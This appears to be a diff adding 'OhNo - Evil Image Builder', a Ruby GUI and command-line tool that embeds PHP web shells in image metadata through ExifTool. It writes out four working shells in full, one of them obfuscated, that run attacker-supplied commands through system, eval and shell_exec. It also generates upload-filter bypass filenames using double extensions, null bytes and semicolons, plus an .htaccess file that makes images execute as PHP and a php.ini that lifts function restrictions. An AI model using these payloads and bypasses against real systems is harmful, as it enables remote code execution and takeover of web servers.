@@ -1,0 +1,946 @@
+#!/usr/bin/env ruby
+#
+# OhNo - Evil Image Builder
+# A Ruby ExifTool GUI of sorts
+# By: Hood3dRob1n
+#
+# Pic: http://i.imgur.com/kh8TqVT.png
+# Beta: http://uppit.com/7w507etqaly0/OhNo.zip
+#
+# Pre-Requisites:
+# apt-get install tk libtk-ruby
+# if require 'tkextlib/tile' throws in `require': TkPackage can't find package tile (RuntimeError)
+#	=> teacup install tile
+#
+# MiniExifTool is a wrapper for ExifTool CLI
+# ExifTool CLI Installation: http://www.sno.phy.queensu.ca/~phil/exiftool/install.html
+#	Download file...
+#   	  cd <your download directory>
+# 	  gzip -dc Image-ExifTool-#.##.tar.gz | tar -xf -
+#  	  cd Image-ExifTool-#.##/
+#	    perl Makefile.PL
+#	    make test
+#	    sudo make install
+#
+
+####### STD GEMS #########
+require 'fileutils'      #
+require 'optparse'       #
+###### NON-STD GEMS ######
+require 'mini_exiftool'  #
+require 'tk'             #
+require 'tkextlib/tile'  #
+require 'colorize'       #
+##########################
+
+HOME=File.expand_path(File.dirname(__FILE__))
+EVIL=HOME + '/evil/'
+UP = EVIL + 'uploads/'
+
+# Terminal Banner
+def banner
+  puts
+  print <<"EOT".white
+ _______________________________ 
+< OhNo - The Evil Image Builder >
+ ------------------------------- 
+  \\                 __ 
+   \\               (OO)
+    \\              (  )
+     \\             /--\\
+       __         / \\  \\ 
+      UOOU\\.'@@@@@@`.\\  )
+      \\__/(@@@@@@@@@@) /
+           (@@@@@@@@)(( 
+           `YY~~~~YY' \\\\
+            ||    ||   >>  
+EOT
+end
+
+# Clear Terminal
+def cls
+  if RUBY_PLATFORM =~ /win32|win64|\.NET|windows|cygwin|mingw32/i
+    system('cls')
+  else
+    system('clear')
+  end
+end
+
+# Delete MetaTag Value
+# Returns True on Success, False otherwise
+def delete(obj, tag)
+  if not obj.tags.include?(tag)
+    return false
+  else
+    obj[tag] = '' # Set to Nothing to Wipe Tag
+    if obj.save
+      return true
+    else
+      return false
+    end
+  end
+end
+
+# Write String to Tag
+# Returns True on Success, False otherwise
+def write(obj, str, tag)
+  obj[tag] = str
+  if obj.save
+    return true
+  else
+    return false
+  end
+end
+
+# Dump Tags & Values
+# Returns Hash {Tag=>Value}
+def dump(obj)
+  tagz={}
+  obj.tags.sort.each do |tag|
+    tagz.store(tag, obj[tag])
+  end
+  return tagz
+end
+
+# Build various Shell Upload Bypass Possibilities
+# Generates many possibilities and writes them to: OhNo/evil_images/uploads/
+def generate_uploads(shell, flip='gif')
+  Dir.mkdir(EVIL) unless File.exists?(EVIL) and File.directory?(EVIL)
+  Dir.mkdir(UP) unless File.exists?(UP) and File.directory?(UP)
+  php = [ 'php', 'pHp', 'php4', 'php5', 'phtml' ]
+  options = [ 'gif', 'jpeg', 'mp3', 'pdf', 'png', 'txt' ]
+  shell_name = shell.split('/')[-1]
+  # Read provided Shell into Var
+  data = File.open(shell).read
+  # Generate our Shell Possibilities for Uploading
+  php.each do |x|
+    a = shell_name.sub(shell.split('/')[-1].split('.')[-1], x)
+    f = File.open(UP + a, 'w+')
+    f.puts data
+    f.close
+  end
+  options.each do |y|
+    # Simple Concatenation of Filetypes: .php.jpeg
+    b = shell_name.sub(shell.split('/')[-1].split('.')[-1], shell.split('/')[-1].split('.')[-1] + '.' + y)
+    f = File.open(UP + b, 'w+')
+    f.puts data
+    f.close
+    if y =~ /GIF|JPEG|PNG/i
+      # Simple Concatenation of Filetypes (reversed order for evil images): .jpeg.php
+      c = shell_name.sub(shell.split('/')[-1].split('.')[-1], y + '.' + shell.split('/')[-1].split('.')[-1])
+      f = File.open(UP + c, 'w+')
+      f.puts data
+      f.close
+    end
+    # Another Concatenation of Filetypes in hopes it drops the trailing type: .php;jpeg
+    d = shell_name.sub(shell.split('/')[-1].split('.')[-1], shell.split('/')[-1].split('.')[-1] + ';.' + y)
+    f = File.open(UP + d, 'w+')
+    f.puts data
+    f.close
+    # Null Byte to drop the trailing filetype
+    e = shell_name.sub(shell.split('/')[-1].split('.')[-1], shell.split('/')[-1].split('.')[-1] + '%00.' + y)
+    f = File.open(UP + e, 'w+')
+    f.puts data
+    f.close
+  end
+  # Bogus separator, unknown extension causes it to fallback to PHP
+  g = shell_name.sub(shell.split('/')[-1].split('.')[-1], shell.split('/')[-1].split('.')[-1] + '.xxxfoo')
+  f = File.open(UP + g, 'w+')
+  f.puts data
+  f.close
+
+  # Create .htaccess file for flipping filetype to php
+  f = File.open(UP + '.htaccess', 'w+')
+  f.puts "AddType application/x-httpd-php .#{flip}"
+  f.close
+
+  # PHP_INI Overrides
+  f = File.open(UP + 'php.ini', 'w+')
+  f.puts 'disable_functions = none'
+  f.puts 'magic_quotes_gpc = off'
+  f.puts 'safe_mode = off'
+  f.puts 'suhosin.executor.func.blacklist = foofucked'
+  f.close
+end
+
+# PHP Shells for Evil Image Builder
+# see more on sneaky shell here: http://blog.sucuri.net/2013/09/ask-sucuri-non-alphanumeric-backdoors.html
+sneaky_shell = '<?php @$_[]=@!+_; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((++$__)+($__++ ))].=$_; $_[]=++$__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__+$__)+ $_[$__-$__]).($__+$__+$__)+$_[$__-$__]; $_[$__+$__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] ); $_[$__+$__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] ); $_[$__+$__] .=($_[$__][$__+$__])^$_[$__][($__<<$__)-$__ ]; $_=$ $_[$__+ $__] ;$_[@-_]($_[@!+_] );?>'
+r0ng_shell = "<?if($_GET['r0ng']){echo'<pre>'.shell_exec($_GET['r0ng']);}?>"
+system_shell = "<?error_reporting(0);print(___);system($_REQUEST[cmd]);print(___);die;?>"
+eval_shell = "<?error_reporting(0);print(___);eval($_REQUEST[cmd]);print(___);die;?>"
+$shell='Sneaky Shell'
+$c=1
+
+########### Start DaGUI ###################
+# Start Root --
+root = TkRoot.new
+root.title = "OhNo!"
+root.height = 900
+root.width = 1200
+# root['resizable'] = false, false
+root.background = 'grey'
+# End Root --
+
+# Start Frames -- 
+# Top Frame
+top_frame = TkFrame.new(root) do
+  height 25
+  width 1200
+  background 'green'
+  pack('side' => 'top', 'fill' => 'x', 'anchor' => 's')
+end
+
+# Bttom Frame
+bottom_frame = TkFrame.new(root) do
+  background 'grey'
+  pack('side' => 'bottom', 'fill' => 'both', 'expand'=> true)
+end
+
+# Left Frame
+left_frame = TkFrame.new(root) do
+  height 175
+  width 210
+  background 'grey'
+  pack('side' => 'left', 'fill' => 'both', 'anchor' => 'se')
+end
+
+# Right Frame
+right_frame = TkFrame.new(root) do
+  background 'grey'
+  pack('side' => 'right', 'fill' => 'both', 'anchor' => 'sw', 'expand'=> true)
+end
+
+# End Frames -- 
+
+# Start Labels -- 
+# Main Greeting Label
+greeting_label = TkLabel.new(top_frame) do
+  padx 10;
+  pady 6;
+  foreground 'black'
+  background 'grey'
+  font TkFont.new('family' => 'times', 'size' => 14, "weight" => 'bold')
+  text 'The Meta Manipulator'
+end
+greeting_label.pack('fill' => 'both')
+
+right_rfill_label = TkLabel.new(right_frame) do
+  padx 10;
+  pady 6;
+  foreground 'black'
+  background 'grey'
+end
+right_rfill_label.pack('side' => 'right', 'fill' => 'y')
+
+bottom_lfill_label = TkLabel.new(bottom_frame) do
+  padx 10;
+  pady 6;
+  foreground 'black'
+  background 'grey'
+end
+bottom_lfill_label.pack('side' => 'left', 'fill' => 'y')
+
+bottom_rfill_label = TkLabel.new(bottom_frame) do
+  padx 10;
+  pady 6;
+  foreground 'black'
+  background 'grey'
+end
+bottom_rfill_label.pack('side' => 'right', 'fill' => 'y')
+
+bottom_bfill_label = TkLabel.new(bottom_frame) do
+  padx 6;
+  pady 6;
+  foreground 'black'
+  background 'grey'
+end
+bottom_bfill_label.pack('side' => 'bottom', 'fill' => 'x')
+
+# OhNo Image Label
+$img_file = "#{HOME}/images/ohno.gif"
+image = TkPhotoImage.new
+image.file = $img_file
+image_label = TkLabel.new(left_frame)
+image_label.image = image
+image_label.relief = 'groove'
+image_label.place('height' => image.height, 'width' => image.width, 'x' => 25, 'y' => 10)
+
+# Loaded Image Label
+loaded_label = TkLabel.new(right_frame) do
+  padx 10;
+  pady 5;
+  foreground 'black'
+  background 'grey'
+#  height 25
+#  width 100
+  font TkFont.new('family' => 'times', 'size' => 12, "weight" => 'bold')
+  text "Currently Loaded: #{$img_file.to_s.split('/')[-1]}"
+end
+loaded_label.place('x' => 10, 'y' => 10)
+
+enter_tag_label = TkLabel.new(right_frame) do
+  padx 10;
+  pady 5;
+  foreground 'black'
+  background 'grey'
+  font TkFont.new('family' => 'times', 'size' => 12, "weight" => 'bold')
+  text "Enter Tag Name"
+end
+enter_tag_label.place('x' => 40, 'y' => 95)
+# End Labels -- 
+
+# Start Tree --
+tree = Tk::Tile::Treeview.new(bottom_frame)
+tree['columns'] = 'Tag Value'
+tree.selectmode = 'extended'
+tree.height = 10
+tree.column_configure( 0, :width => 300, :anchor => 'center', 'stretch' => true)
+tree.heading_configure( 0, :text => 'Tag Name')
+tree.column_configure( 1, :width => 300, :anchor => 'center', 'stretch' => true)
+tree.heading_configure( 1, :text => 'Value')
+
+# Test Value for load.....
+img_name = TkVariable.new
+img_name = HOME + '/images/ohno.gif'
+$photo = MiniExiftool.new(img_name)
+
+count=0
+entries = dump($photo)
+entries.each do |tag, value|
+  if count.to_i > 0
+    tree.insert( 'img', 'end', :values => [tag, value])
+  else
+    tree.insert('', 0, :id => 'img', :text => img_name, :values => [tag, value])
+    count = count.to_i + 1
+  end
+end
+tree.itemconfigure('img', 'open', true);
+tree_yscrollbar = TkScrollbar.new(tree) do
+  pack('side'=>'right','fill'=>'y')
+end
+tree_xscrollbar = TkScrollbar.new(tree) do
+  pack('side'=>'bottom','fill'=>'x')
+end
+tree.yscrollbar(tree_yscrollbar);
+tree.xscrollbar(tree_xscrollbar);
+tree.pack('side' => 'bottom', 'fill' => 'both', 'expand'=> true)
+# End Tree --
+
+# Tag Results Label
+tags_label = TkLabel.new(bottom_frame) do
+  padx 10;
+  pady 6;
+  foreground 'black'
+  background 'grey'
+  font TkFont.new('family' => 'times', 'size' => 12, "weight" => 'bold')
+  text 'Currently Available Tags & Associated Values'
+end
+tags_label.pack('side' => 'top', 'fill' => 'x')
+
+# Start Input Boxes -- 
+# Tag Name input
+tag_input = TkEntry.new(right_frame) { background 'white'; justify 'center'; relief 'sunken' }
+tag_var = TkVariable.new
+tag_input.textvariable = tag_var
+tag_var.value = 'Comment'
+tag_input.place('height' => 25, 'width' => 200, 'x' => 10, 'y' => 140)
+
+# Write String input
+write_input = TkEntry.new(right_frame) { background 'white'; justify 'center'; relief 'sunken' }
+write_var = TkVariable.new
+write_input.textvariable = write_var
+write_var.value = 'Custom String or Cool Code Here'
+write_input.place('height' => 25, 'width' => 235, 'x' => 270, 'y' => 110)
+# End Input Boxes -- 
+
+# Start ComboBox --
+# Shell Options Drop Down
+shell_entries = TkVariable.new
+combobox = Tk::Tile::Combobox.new(right_frame) { textvariable shell_entries; justify 'center'; }
+combobox.values = [ 'Sneaky Shell', 'r0ng Shell', 'System Shell', 'Eval Shell', "I'm Using Custom String" ]
+combobox.state = 'readonly'
+combobox.set('--+Select Shell+--')
+combobox.place('height' => 25, 'width' => 240, 'x' => 270, 'y' => 45)
+combobox.bind("<ComboboxSelected>") { $shell = combobox.get; puts "Shell Option set to".light_blue + ": #{$shell}".white }
+# End ComboBox --
+
+# Start Buttons --
+# Import New Image Button
+import_btn = TkButton.new(right_frame) do
+  font TkFont.new('family' => 'times', 'size' => 10, "weight" => 'bold')
+  text "Import New Image"
+  borderwidth 3
+  relief "groove"
+  padx 45;
+  pady 5;
+  command proc { 
+    #user supplies image file to read into variable
+    begin
+      $img_file = Tk::getOpenFile :initialdir => "#{HOME}/images/", :initialfile => 'ohno.gif', :title => 'Select Image File to Import'
+      img_name = $img_file.to_s.split('/')[-1]
+      $photo = MiniExiftool.new($img_file)
+      count=0
+      # Dump Info from new file
+      entries = dump($photo)
+      # Clear the current image content
+      tree.detach "img" if $c.to_i <= 1
+      tree.detach "img#{$c.to_i - 1}" if $c.to_i > 1
+      # Refill it now
+      entries.each do |tag, value|
+        if count.to_i > 0
+          tree.insert( "img#{$c}", 'end', :values => [tag, value])
+        else
+          tree.delete
+          tree.insert('', 0, :id => "img#{$c}", :text => img_name, :values => [tag, value])
+          tree.itemconfigure("img#{$c}", 'open', true);
+          count = count.to_i + 1
+        end
+      end
+      $c = $c.to_i + 1
+      puts "Image Changed to".light_blue + ": #{$img_file.to_s.split('/')[-1]}".white
+      loaded_label.configure('text'=>"Currently Loaded: #{$img_file.to_s.split('/')[-1]}"); 
+    rescue
+      puts 'Problem Importing Image File'.light_red + '!'.white
+      Tk::messageBox(:message => 'Problem Importing Image File!', :title => 'Epic Fail!');
+    end
+  }
+end
+import_btn.place('x' => 10, 'y' => 45)
+
+# Delete Button
+delete_btn = TkButton.new(right_frame) do
+  font TkFont.new('family' => 'times', 'size' => 11, "weight" => 'bold')
+  text 'Delete Tag/Value'
+  padx 60;
+  pady 0;
+  borderwidth 3
+  relief "groove"
+  command proc { 
+    tag_name = tag_input.get.to_s.strip
+    if delete($photo, tag_name)
+      $photo.reload
+      count=0
+      # Dump Info from new file
+      entries = dump($photo)
+      # Clear the current image content
+      tree.detach "img" if $c.to_i <= 1
+      tree.detach "img#{$c.to_i - 1}" if $c.to_i > 1
+      # Refill it now
+      entries.each do |tag, value|
+        if count.to_i > 0
+          tree.insert( "img#{$c}", 'end', :values => [tag, value])
+        else
+          tree.delete
+          tree.insert('', 0, :id => "img#{$c}", :text => img_name, :values => [tag, value])
+          tree.itemconfigure("img#{$c}", 'open', true);
+          count = count.to_i + 1
+        end
+      end
+      $c = $c.to_i + 1
+      puts "Deletion Complete".light_blue + "!".white
+      puts "Reloaded".light_blue + ": #{$img_file.to_s.split('/')[-1]}".white
+      loaded_label.configure('text'=>"Currently Loaded: #{$img_file.to_s.split('/')[-1]}"); 
+      Tk::messageBox(:message => "#{tag_name} tag data deleted! Reload image to confirm....", :title => 'MetaWipe');
+    else
+      Tk::messageBox(:message => "Problem deleting #{tag_name} tag! Check tag exists, is spelling correctly, is writable and then try again.....", :title => 'MetaWipe Failure');
+    end
+  }
+end
+delete_btn.place('x' => 270, 'y' => 10)
+
+# Shell Write Button
+shell_write_btn = TkButton.new(right_frame) do
+  font TkFont.new('family' => 'times', 'size' => 11, "weight" => 'bold')
+  text 'Write Shell to Tag'
+  padx 55;
+  pady 0;
+  borderwidth 3
+  relief "groove"
+  command proc { 
+    tag_name = tag_input.get.to_s.strip
+    shell_name = combobox.get.to_s.strip
+    good=false
+    case shell_name
+    when 'System Shell'
+      good=true
+      payload = system_shell
+      c = "http://localhost/forum/profile.php?inc=/profiles/0123456789/#{$img_file.split('/')[-1]}?cmd=id"
+    when 'Eval Shell'
+      good=true
+      payload = eval_shell
+      c = "http://localhost/#{$img_file.to_s.split('/')[-1]}?cmd=system('id');"
+    when 'Sneaky Shell'
+      good=true
+      payload = sneaky_shell
+      c = "http://localhost/#{$img_file.split('/')[-1]}?0=system&1=id"
+    when 'r0ng Shell'
+      good=true
+      payload = r0ng_shell
+      c = "http://localhost/#{$img_file.split('/')[-1]}?r0ng=id"
+    else
+      good=false
+      Tk::messageBox(:message => "No Shell Selected! \nSelect a valid Shell Option or try the other button....", :title => 'OhNo - Epic Failure!');
+    end
+    if good
+      tmp = HOME + '/temp'
+      Dir.mkdir(EVIL) unless File.exists?(EVIL) and File.directory?(EVIL)
+      Dir.mkdir(tmp) unless File.exists?(tmp) and File.directory?(tmp)
+      real = MiniExiftool.new($img_file)
+      innocent = tmp + '/' + $img_file.split('/')[-1]
+      FileUtils.copy_file($img_file, innocent, preserve = true)
+      Dir.chdir(tmp) do
+        photo = MiniExiftool.new($img_file.split('/')[-1])
+        v = photo.exiftool_version.to_s.split('.')
+        height = photo.image_height
+        width = photo.image_width
+        puts
+        puts "ExifTool v#{v[0]}".light_red + ".".white + "#{v[1]}".light_red
+        puts
+        if not real.tags.include?(tag_name)
+          puts "Provided Tag doesn't appear to exist".light_red + "!".white
+          Tk::messageBox(:message => "#{tag_name} doesn't apear to exist! Try generic tag....", :title => 'Warning!');
+          if real.tags.include?('Comment')
+            puts "Trying generic approach to try and write to 'Comment' Tag".light_yellow + ".....".white
+            tag_name = 'Comment'
+          else
+            puts "Trying generic approach to create and write to Comment Tag".light_yellow + ".....".white
+            tag_name = 'Comment'
+          end
+        end
+        original = photo[tag_name]
+        puts "Attempting to write ".light_blue + "'".white + "#{shell_name}".light_blue + "'".white + " to the ".light_blue + "'".white + "#{tag_name}".light_blue + "'".white + " tag".light_blue + "....".white
+        puts "Current Value".light_blue + ": #{original}".white
+        puts "Write String".light_blue + ": \n#{payload}".white
+        puts
+        if write(photo, payload, tag_name)
+          photo.reload
+          count=0
+          if original != photo[tag_name]
+            $photo = photo
+            FileUtils.copy_file($img_file.split('/')[-1], "#{EVIL}/#{$img_file.split('/')[-1]}", preserve = true)
+            # Dump Info from new file
+            entries = dump($photo)
+            # Clear the current image content
+            tree.detach "img" if $c.to_i <= 1
+            tree.detach "img#{$c.to_i - 1}" if $c.to_i > 1
+            # Refill it now
+            entries.each do |tag, value|
+              if count.to_i > 0
+                tree.insert( "img#{$c}", 'end', :values => [tag, value])
+              else
+                tree.delete
+                tree.insert('', 0, :id => "img#{$c}", :text => img_name, :values => [tag, value])
+                tree.itemconfigure("img#{$c}", 'open', true);
+                count = count.to_i + 1
+              end
+            end
+            $c = $c.to_i + 1
+            puts
+            Tk::messageBox(:message => "#{shell_name} written successfully! \nFind your evil image here: #{EVIL}#{$img_file.split('/')[-1]}\nTo execute: #{c}", :title => 'OhNo - Evil Image Success!');
+            puts "Appears things were successful".light_green + "!".white
+            puts "Updated Value".light_green + ": #{photo[tag_name]}".white
+            puts "Find your evil image here".light_green + ": #{EVIL}#{$img_file.split('/')[-1]}".white
+            puts "Example #{shell_name} Shell Execution".light_green + ": #{c}".white
+          else
+            Tk::messageBox(:message => "Problem writing to #{tag_name}! \nMake sure Tag name exists, is spelled properly, is writable and then try again....", :title => 'OhNo - Epic Failure!');
+            puts "WTF".light_red + "?".white + " Doesn't appear we changed the value".light_red + ".....".white
+            puts "Value".light_yellow + ": #{photo[tag_name]}".white
+            puts "Make sure Tag name was spelled properly, is writable and try again".light_red + "...".white
+          end
+        else
+          Tk::messageBox(:message => "Problem writing to #{tag_name}! \nMake sure Tag name exists, is spelled properly, is writable and then try again....", :title => 'OhNo - Epic Failure!');
+          puts "Problem writing to '#{tag_name}' Tag".light_red + "!".white
+          puts "Make sure Tag name exists, is spelled properly, is writable and then try again".light_red + "...".white
+        end
+      end
+      FileUtils.rm_rf(tmp)
+    end
+  }
+end
+shell_write_btn.place('x' => 270, 'y' => 75)
+
+# String Write Button
+string_write_btn = TkButton.new(right_frame) do
+  font TkFont.new('family' => 'times', 'size' => 11, "weight" => 'bold')
+  text 'Write String to Tag'
+  padx 50;
+  pady 0;
+  borderwidth 3
+  relief "groove"
+  command proc { 
+    good=false
+    tag_name = tag_input.get.to_s.strip
+    str = write_input.get.to_s.strip
+    if str != 'Custom String or Cool Code Here'
+      good=true
+    end
+    if good
+      tmp = HOME + '/temp'
+      Dir.mkdir(EVIL) unless File.exists?(EVIL) and File.directory?(EVIL)
+      Dir.mkdir(tmp) unless File.exists?(tmp) and File.directory?(tmp)
+      real = MiniExiftool.new($img_file)
+      innocent = tmp + '/' + $img_file.split('/')[-1]
+      FileUtils.copy_file($img_file, innocent, preserve = true)
+      Dir.chdir(tmp) do
+        photo = MiniExiftool.new($img_file.split('/')[-1])
+        v = photo.exiftool_version.to_s.split('.')
+        height = photo.image_height
+        width = photo.image_width
+        puts
+        puts "ExifTool v#{v[0]}".light_red + ".".white + "#{v[1]}".light_red
+        puts
+        if not real.tags.include?(tag_name)
+          puts "Provided Tag doesn't appear to exist".light_red + "!".white
+          Tk::messageBox(:message => "#{tag_name} doesn't apear to exist! Try generic tag....", :title => 'Warning!');
+          if real.tags.include?('Comment')
+            puts "Trying generic approach to try and write to 'Comment' Tag".light_yellow + ".....".white
+            tag_name = 'Comment'
+          else
+            puts "Trying generic approach to create and write to Comment Tag".light_yellow + ".....".white
+            tag_name = 'Comment'
+          end
+        end
+        original = photo[tag_name]
+        puts "Attempting to write to the ".light_blue + "'".white + "#{tag_name}".light_blue + "'".white + " tag".light_blue + "....".white
+        puts "Current Value".light_blue + ": #{original}".white
+        puts "Write String".light_blue + ": \n#{str}".white
+        puts
+        if write(photo, str, tag_name)
+          photo.reload
+          count=0
+          if original != photo[tag_name]
+            $photo = photo
+            FileUtils.copy_file($img_file.split('/')[-1], "#{EVIL}/#{$img_file.split('/')[-1]}", preserve = true)
+            # Dump Info from new file
+            entries = dump($photo)
+            # Clear the current image content
+            tree.detach "img" if $c.to_i <= 1
+            tree.detach "img#{$c.to_i - 1}" if $c.to_i > 1
+            # Refill it now
+            entries.each do |tag, value|
+              if count.to_i > 0
+                tree.insert( "img#{$c}", 'end', :values => [tag, value])
+              else
+                tree.delete
+                tree.insert('', 0, :id => "img#{$c}", :text => $img_file.split('/')[-1], :values => [tag, value])
+                tree.itemconfigure("img#{$c}", 'open', true);
+                count = count.to_i + 1
+              end
+            end
+            $c = $c.to_i + 1
+            puts
+            Tk::messageBox(:message => "Custom String written successfully! \nFind your evil image here: #{EVIL}#{$img_file.split('/')[-1]}", :title => 'OhNo - Evil Image Success!');
+            puts "Appears things were successful".light_green + "!".white
+            puts "Updated Value".light_green + ": #{photo[tag_name]}".white
+            puts "Find your evil image here".light_green + ": #{EVIL}#{$img_file.split('/')[-1]}".white
+          else
+            Tk::messageBox(:message => "Problem writing to #{tag_name}! \nMake sure Tag name exists, is spelled properly, is writable and then try again....", :title => 'OhNo - Epic Failure!');
+            puts "WTF".light_red + "?".white + " Doesn't appear we changed the value".light_red + ".....".white
+            puts "Value".light_yellow + ": #{photo[tag_name]}".white
+            puts "Make sure Tag name was spelled properly, is writable and try again".light_red + "...".white
+          end
+        else
+          Tk::messageBox(:message => "Problem writing to #{tag_name}! \nMake sure Tag name exists, is spelled properly, is writable and then try again....", :title => 'OhNo - Epic Failure!');
+          puts "Problem writing to '#{tag_name}' Tag".light_red + "!".white
+          puts "Make sure Tag name exists, is spelled properly, is writable and then try again".light_red + "...".white
+        end
+      end
+      FileUtils.rm_rf(tmp)
+    end
+  }
+end
+string_write_btn.place('x' => 270, 'y' => 140)
+
+# End Buttons --
+############ End DaGUI ####################
+
+
+### MAIN ### ##
+##################################### #
+options = {}
+optparse = OptionParser.new do |opts| 
+  opts.banner = "Usage".light_blue + ": #{$0} ".white + "[".light_blue + "OPTIONS".white + "]".light_blue
+  opts.separator ""
+  opts.separator "EX".light_blue + ": #{$0} -x".white
+  opts.separator "EX".light_blue + ": #{$0} -i ./images/ohno.jpeg -d".white
+  opts.separator "EX".light_blue + ": #{$0} -i ./images/ohno.gif -g 1 -t Comment".white
+  opts.separator "EX".light_blue + ": #{$0} -i ./images/ohno.gif -w 'HR was here' -t 'Comment'".white
+  opts.separator ""
+  opts.separator "Options".light_blue + ": ".white
+  opts.on('-x', '--start-gui', "\n\tStart OhNo in GUI mode".white) do |blah|
+    options[:method] = 0
+  end
+  opts.on('-i', '--image IMG', "\n\tImage File to Use".white) do |img|
+    if File.exists?(img.chomp) and not File.directory?(img.chomp)
+      options[:img] = img.chomp
+    else
+      cls
+      banner
+      puts
+      puts "Problem loading Image file".light_red + "!".white
+      puts "Check path and permissions and try again".light_red + ".....".white
+      puts
+      puts opts
+      puts
+      exit 666;
+    end
+  end
+  opts.on('-d', '--dump', "\n\tDump All Tags w/Values".white) do |meh|
+    options[:method] = 1
+  end
+  opts.on('-w', '--write STRING', "\n\tWrite Custom String to Tag".white) do |write_str|
+    options[:method] = 2
+    options[:str] = write_str.chomp
+  end
+  opts.on('-g', '--generate NUM', "\n\tWrite PHP Shell to Tag\n\t  0 => Sneaky Shell\n\t  1 => r0ng Shell\n\t  2 => Simple System() Shell\n\t  3 => Simple Eval Shell".white) do |num|
+    options[:method] = 3
+    if num.chomp.to_i >= 0 and num.chomp.to_i <= 3
+      options[:shell] = num.chomp.to_i
+    else
+      cls
+      banner
+      puts
+      puts "Unknown Shell Generator Option Requested".light_red + "!".white
+      puts
+      puts opts
+      puts
+      exit 69;
+    end
+  end
+  opts.on('-t', '--tag TAG', "\n\tTag Name to Write to".white) do |tag|
+    options[:tag] = tag.chomp
+  end
+  opts.on('-n', '--nuke TAG', "\n\tTry to Delete Tag".white) do |tag|
+    options[:method] = 4
+    options[:tag] = tag.chomp
+  end
+  opts.on('-u', '--uploads-gen SHELL', "\n\tGenerate Upload Bypass Possibilities for Shell".white) do |shell|
+    if File.exists?(shell.chomp) and not File.directory?(shell.chomp)
+      options[:method] = 5
+      options[:shell] = shell.chomp
+    else
+      cls
+      banner
+      puts
+      puts "Problem loading Shell file".light_red + "!".white
+      puts "Check path and permissions and try again".light_red + ".....".white
+      puts
+      puts opts
+      puts
+      exit 69;
+    end
+    options[:shell] = shell.chomp
+  end
+  opts.on('-h', '--help', "\n\tHelp Menu".white) do 
+    cls
+    banner
+    puts
+    puts opts
+    puts
+    exit 69;
+  end
+end
+begin
+  foo = ARGV[0] || ARGV[0] = "-h"
+  optparse.parse!
+  if options[:method].to_i == 0
+    mandatory = [:method] # GUI Mode
+  elsif options[:method].to_i == 1
+    mandatory = [:method, :img] # CLI DUMP
+  elsif options[:method].to_i == 3
+    mandatory = [:method, :img, :tag, :shell] # CLI Evil Image Generator
+  elsif options[:method].to_i == 5
+    mandatory = [:method, :shell] # CLI DUMP
+  elsif not options[:generate].nil?
+    mandatory = [:method, :img] # CLI DUMP
+  else
+    mandatory = [:method, :img, :tag] # CLI WRITE OR NUKE
+  end
+  missing = mandatory.select{ |param| options[param].nil? }
+  if not missing.empty?
+    cls
+    banner
+    puts
+    puts "Missing options".light_red + ": #{missing.join(', ')}".white
+    puts optparse
+    exit 666;
+  end
+rescue OptionParser::InvalidOption, OptionParser::MissingArgument
+  cls
+  banner
+  puts
+  puts $!.to_s
+  puts
+  puts optparse
+  puts
+  exit 666;   
+end
+cls
+banner
+case options[:method].to_i
+when 0
+  # GUI
+  puts "\nStarting the GUI now".light_blue + "....".white
+  Tk.mainloop()
+when 1
+  # Tag Dump
+  photo = MiniExiftool.new(options[:img])
+  v = photo.exiftool_version.to_s.split('.')
+  height = photo.image_height
+  width = photo.image_width
+  puts
+  puts "ExifTool v#{v[0]}".light_red + ".".white + "#{v[1]}".light_red
+  puts
+  puts "Meta Info from".light_blue + ": #{options[:img].split('/')[-1]}".white
+  puts "Image Dimensions".white.underline + ": ".white
+  puts "Image Height".light_blue + ": #{height}".white
+  puts "Image Width".light_blue + ": #{width}".white
+  puts
+  puts "Available Tags".white.underline + ": ".white
+  photo.tags.sort.each do |tag|
+    puts "#{tag}".light_blue + ": #{photo[tag]}".white
+  end
+when 2
+  # Write to Tag
+  photo = MiniExiftool.new(options[:img])
+  v = photo.exiftool_version.to_s.split('.')
+  height = photo.image_height
+  width = photo.image_width
+  puts
+  puts "ExifTool v#{v[0]}".light_red + ".".white + "#{v[1]}".light_red
+  puts
+  if not photo.tags.include?(options[:tag])
+    puts "Provided Tag doesn't appear to exist".light_red + "!".white
+    if photo.tags.include?('Comment')
+      puts "Trying generic approach to try and write to 'Comment' Tag".light_yellow + ".....".white
+      options[:tag] = 'Comment'
+    else
+      puts "Trying generic approach to create and write to Comment Tag".light_yellow + ".....".white
+      options[:tag] = 'Comment'
+    end
+  end
+  original = photo[options[:tag]]
+  puts "Attempting write to the ".light_blue + "'".white + "#{options[:tag]}".light_blue + "'".white + " tag".light_blue + "....".white
+  puts "Current Value".light_blue + ": #{original}".white
+  puts "Write String".light_blue + ": #{options[:str]}".white
+  if write(photo, options[:str], options[:tag])
+    photo.reload # reload the new file info
+    if original != photo[options[:tag]]
+      puts
+      puts "Appears things were successful".light_green + "!".white
+      puts "Updated Value".light_green + ": #{photo[options[:tag]]}".white
+    else
+      puts "WTF".light_red + "?".white + " Doesn't appear we changed the value".light_red + ".....".white
+      puts "Value".light_yellow + ": #{photo[options[:tag]]}".white
+      puts "Make sure Tag name was spelled properly, is writable and try again".light_red + "...".white
+    end
+  else
+    puts "Problem writing to '#{options[:tag]}' Tag".light_red + "!".white
+    puts "Make sure Tag name exists, is spelled properly, is writable and then try again".light_red + "...".white
+  end
+when 3
+  # Evil Image Shell Generator
+  case options[:shell].to_i
+  when 0
+    # Sneaky Shell
+    shell = 'Sneaky'
+    payload = sneaky_shell
+    c = "http://localhost/#{options[:img].split('/')[-1]}?0=system&1=id"
+  when 1
+    # r0ng Shell
+    shell = 'r0ng'
+    payload = r0ng_shell
+    c = "http://localhost/#{options[:img].split('/')[-1]}?r0ng=id"
+  when 2
+    # System Shell
+    shell = 'System'
+    payload = system_shell
+    c = "http://localhost/forum/profile.php?inc=/profiles/0123456789/#{options[:img].split('/')[-1]}?cmd=id"
+  when 3
+    # Eval Shell
+    shell = 'Eval'
+    payload = eval_shell
+    c = "http://localhost/#{options[:img].split('/')[-1]}?cmd=system('id');"
+  end
+  # Make sure our evil images directory exists, if not create
+  # We also create a temporary directory to move images in and out of for use without affecting original
+  # Delete temp dir and cleanup when done
+  tmp = HOME + '/temp'
+  Dir.mkdir(EVIL) unless File.exists?(EVIL) and File.directory?(EVIL)
+  Dir.mkdir(tmp) unless File.exists?(tmp) and File.directory?(tmp)
+
+  real = MiniExiftool.new(options[:img])
